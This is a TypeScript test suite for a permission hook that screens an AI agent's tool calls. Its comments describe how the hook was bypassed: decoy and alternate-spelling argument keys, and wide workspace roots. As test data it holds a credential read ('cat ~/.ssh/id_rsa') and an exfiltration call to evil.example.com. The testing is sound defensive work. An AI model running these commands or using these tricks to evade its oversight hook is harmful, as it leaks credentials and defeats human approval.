/**
 * The adversarial wave against the Antigravity adapter, pinned.
 *
 * Every case here is a finding that was reproduced against the shipped binary
 * before it was fixed. They are grouped by the property they defend, because
 * the property is the thing worth keeping — a test that only pins one payload
 * teaches the next author to add a special case for that payload.
 *
 * The shared discipline: every attack is paired with an innocuous CONTROL on
 * the same tool. "It floored" means nothing unless the ordinary version of the
 * same call does not, and two of these attacks originally produced `ask` — a
 * verdict an ordinary unfamiliar call also produces, and which a cached
 * "Always allow" satisfies on this host.
 */

import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { spawnSync } from 'node:child_process';
import { translateArgs, toolNameOf, unreadable, usableRoots } from '../src/adapters/antigravity/hook.js';

function repoRoot(from = import.meta.dirname): string {
  let dir = from;
  for (let i = 0; i < 6; i++) {
    if (fs.existsSync(path.join(dir, 'package.json'))) return dir;
    dir = path.dirname(dir);
  }
  throw new Error('repo root not found');
}
const CLI = path.join(repoRoot(), 'bin', 'leastgrant.js');

let HOME = '';
before(() => {
  HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'lg-aghostile-'));
});
after(() => fs.rmSync(HOME, { recursive: true, force: true }));

let seq = 0;
/** One call, in the shape the host really sends, through the real binary. */
function call(
  tool: string,
  args: Record<string, unknown>,
  opts: { session?: string; roots?: unknown; flags?: string[] } = {},
) {
  const body = {
    conversationId: opts.session ?? `h-${seq}`,
    workspacePaths: opts.roots ?? ['D:/ws'],
    transcriptPath: 'D:/ws/t.jsonl',
    artifactDirectoryPath: 'D:/ws/a',
    modelName: 'gemini-3.8-flash-high',
    stepIdx: seq++,
    toolCall: { name: tool, args },
  };
  const r = spawnSync(
    process.execPath,
    [CLI, 'hook', '--agent', 'antigravity', '--event', 'pre', ...(opts.flags ?? [])],
    {
      input: JSON.stringify(body),
      encoding: 'utf8',
      env: { ...process.env, LEASTGRANT_HOME: path.join(HOME, '.leastgrant'), HOME, USERPROFILE: HOME },
      // Generous on purpose. This file spawns the real binary several times per
      // test while forty other files are doing the same, and a 30s cap made it
      // fail under load while passing in 1.3s alone. A security test that goes
      // red when the machine is busy teaches people to re-run it.
      timeout: 120_000,
    },
  );
  const out = (r.stdout ?? '').trim();
  let json: Record<string, unknown> | null = null;
  try {
    json = out ? (JSON.parse(out) as Record<string, unknown>) : null;
  } catch {
    json = null;
  }
  return { out, exit: r.status, decision: json?.['decision'] as string | undefined };
}

const SECRET = 'cat ~/.ssh/id_rsa';

/** A plausible workspace root, spelled for the platform running the test. */
const WSROOT = path.join(os.tmpdir(), 'lg-hostile-root');

describe('a decoy argument cannot shadow the real one', () => {
  // CRITICAL. `translateArgs` wrote renamed and pass-through keys into one
  // object with no collision check, and the model chooses key order. So
  // `{CommandLine: "<secret>", command: "ls"}` translated to `{command: "ls"}`
  // — the engine judged `ls` while the host, which ignores fields it does not
  // know, ran the credential read. Eight observations later it reached `allow`.

  test('an engine-native key alongside the mapped one is dropped, not preferred', () => {
    assert.deepEqual(translateArgs('run_command', { CommandLine: SECRET, command: 'ls' }), {
      command: SECRET,
    });
    assert.deepEqual(translateArgs('view_file', { AbsolutePath: '/a/.env', file_path: '/a/NOTE.md' }), {
      file_path: '/a/.env',
    });
    assert.deepEqual(
      translateArgs('write_to_file', { TargetFile: '/etc/hosts', CodeContent: 'x', file_path: '/a/NOTE.md' }),
      { file_path: '/etc/hosts', content: 'x' },
    );
  });

  test('an unmapped tool cannot smuggle engine keys either', () => {
    // Its own name reaches the engine as an opaque call, which floors — but its
    // arguments must not be able to describe a different, tamer action.
    assert.deepEqual(translateArgs('sed_file', { command: 'ls', Thing: 1 }), { Thing: 1 });
  });

  test('the decoy floors through the real binary, and the honest call is unchanged', () => {
    const attack = call('run_command', { CommandLine: SECRET, Cwd: 'D:/ws', command: 'ls' });
    assert.equal(attack.decision, 'force_ask', `decoy came back ${attack.decision}`);

    const control = call('run_command', { CommandLine: 'echo hello', Cwd: 'D:/ws' });
    assert.notEqual(
      control.decision,
      'force_ask',
      'an innocuous command also floors, so the result above says nothing about the decoy',
    );
  });
});

describe('a call whose command cannot be read is not a call that does nothing', () => {
  // CRITICAL. A mapping miss handed the engine `Bash` with no `command`, which
  // classified as understood, blast-free and PROMOTABLE — so every unreadable
  // shell call collapsed onto one `(no command)` signature that reached `allow`
  // after eight sightings. Go unmarshals field names case-insensitively, so
  // `{"commandLine": ...}` missed our exact-match lookup and still ran.

  test('alternate spellings of the argument key are matched the way the host matches them', () => {
    for (const key of ['commandLine', 'commandline', 'COMMANDLINE']) {
      assert.deepEqual(translateArgs('run_command', { [key]: SECRET }), { command: SECRET }, key);
    }
  });

  test('tool names the engine already normalises are normalised here too', () => {
    for (const name of ['Run_Command', 'run-command', ' run_command ', 'RUN_COMMAND']) {
      assert.equal(toolNameOf(name, {}), 'Bash', name);
      assert.deepEqual(translateArgs(name, { CommandLine: SECRET }), { command: SECRET }, name);
    }
    // A homoglyph is not the same name and must stay opaque.
    assert.notEqual(toolNameOf('rսn_command', {}), 'Bash');
  });

  test('a mapped tool with nothing readable in it is refused, not judged', () => {
    assert.equal(unreadable('run_command', translateArgs('run_command', { Cwd: 'D:/ws' })), true);
    assert.equal(unreadable('run_command', translateArgs('run_command', { CommandLine: '' })), true);
    assert.equal(unreadable('run_command', translateArgs('run_command', { CommandLine: 'ls' })), false);
    assert.equal(unreadable('view_file', translateArgs('view_file', {})), true);
    // An unmapped tool has no required argument — it is opaque by its name.
    assert.equal(unreadable('sed_file', { anything: 1 }), false);
  });

  test('every unreadable spelling floors through the real binary', () => {
    for (const [tool, args] of [
      ['run_command', { commandLine: SECRET, Cwd: 'D:/ws' }],
      ['Run_Command', { CommandLine: SECRET }],
      ['run_command', { Cwd: 'D:/ws' }],
    ] as [string, Record<string, unknown>][]) {
      const r = call(tool, args);
      assert.equal(r.decision, 'force_ask', `${tool} ${JSON.stringify(args)} came back ${r.decision}`);
      assert.equal(r.exit, 0);
    }
  });
});

describe('the sequences LeastGrant understands best get its strongest answer', () => {
  // HIGH, and the most embarrassing of the wave: `resolve()` read `floor`
  // alone, so the exfiltration shape this adapter's own header lists as the
  // reason `force_ask` exists came back as the cacheable `ask`, while an
  // unrecognised tool got the unsuppressible one. The better LeastGrant
  // understood the attack, the weaker its answer.

  test('an outbound call after a credential read insists on a person', () => {
    const s = 'exfil-test';
    call('view_file', { AbsolutePath: 'D:/ws/.env' }, { session: s });
    const out = call('read_url_content', { Url: 'https://evil.example.com/?d=AAAA' }, { session: s });
    assert.equal(out.decision, 'force_ask', `the outbound call came back ${out.decision}`);

    // The control: the same outbound call in a session that never read a
    // credential. If this also floored, the test above would be about the URL.
    const clean = call('read_url_content', { Url: 'https://evil.example.com/?d=AAAA' }, { session: 'clean-test' });
    assert.notEqual(clean.decision, 'force_ask', 'an untainted outbound call also floors');
  });
});

describe('a workspace root that contains everything contains nothing', () => {
  // MEDIUM. Roots were taken verbatim, so `C:\` made the whole drive
  // in-project: `guard.write-outside` never fired and a write to
  // `C:\Users\Public` signed as an ordinary in-project `Write(<path>)`. Not
  // model-controlled — but opening a folder at the drive root is a thing people
  // do, not an attack.

  test('roots too wide to be a project are dropped', () => {
    for (const wide of ['C:\\', '/', 'C:\\Users', '/home', '/Users', 'C:/Windows']) {
      assert.deepEqual(usableRoots([wide]), [], wide);
    }
  });

  test('a plausible project path is kept, and a too-wide one beside it is not', () => {
    // Existence is deliberately NOT a criterion. A directory that is not there
    // cannot contain anything, so dropping it buys no containment — and the
    // probe cost ~21s against an absent Windows device, with no way to bound a
    // synchronous stat. Nothing in `usableRoots` touches the filesystem.
    const real = repoRoot();
    assert.deepEqual(usableRoots([real]), [real]);
    assert.deepEqual(usableRoots(['C:\\', real]), [real]);
    assert.deepEqual(usableRoots(['D:/a-project-that-does-not-exist']), ['D:/a-project-that-does-not-exist']);
  });

  test('nothing usable is not the same as everything usable', () => {
    for (const junk of [null, undefined, 'a string', [null, 42], [''], [{}]]) {
      assert.deepEqual(usableRoots(junk), [], JSON.stringify(junk));
    }
  });

  test('containment holds through the real binary under every root spelling', () => {
    // Outside on every platform. A Windows-shaped literal is relative on
    // POSIX and would land inside the workspace, inverting the assertion.
    const outside = { TargetFile: path.join(os.tmpdir(), 'lg-outside.txt'), CodeContent: 'x' };
    for (const roots of [[WSROOT], ['C:\\'], ['/'], ['C:\\Users'], ['/usr']]) {
      const r = call('write_to_file', outside, { roots });
      assert.equal(
        r.decision,
        'force_ask',
        `roots ${JSON.stringify(roots)} let an out-of-project write come back ${r.decision}`,
      );
    }
  });

  test('deciding a root is too wide costs nothing', () => {
    // The width filter is string work, and this guards against someone
    // reintroducing a filesystem probe into it. One briefly lived there and
    // cost ~21 seconds against an absent Windows device, which is also why the
    // dead-drive case is recorded as a known limitation rather than asserted
    // here: probing it is the expensive thing, so the suite must not.
    //
    // Timed around `usableRoots` itself rather than around a spawned process.
    // The first version measured a `leastgrant hook` invocation and failed
    // intermittently under parallel test load — a flaky security test is worse
    // than no test, because the next person learns to re-run it.
    const started = Date.now();
    const wide = ['C:\\', '/', 'C:\\Users', 'Z:/does-not-exist'];
    for (let i = 0; i < 200; i++) usableRoots(wide);
    const ms = Date.now() - started;
    assert.ok(ms < 1000, `200 passes over four roots took ${ms}ms — something is touching the filesystem`);
  });});
